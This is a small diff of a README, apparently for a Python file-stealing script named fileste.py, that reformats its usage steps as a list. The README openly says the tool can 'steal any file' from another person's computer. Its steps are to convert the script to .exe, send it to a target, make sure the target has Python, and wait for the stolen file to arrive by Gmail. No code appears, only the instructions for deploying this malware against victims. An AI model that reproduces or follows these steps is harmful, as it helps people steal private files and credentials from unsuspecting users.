@@ -5,8 +5,8 @@ this thing can steal any file on another dude computer...
 
   make sure u type the file u wanna steal and login information in the fileste.py!!!
   
-first, convert the code from .py to .exe
-second, send to your target you wanna steal
-third, make sure your target also have python installed
-fourth, await the file in your gmail
+- first, convert the code from .py to .exe
+- second, send to your target you wanna steal
+- third, make sure your target also have python installed
+- fourth, await the file in your gmail
 
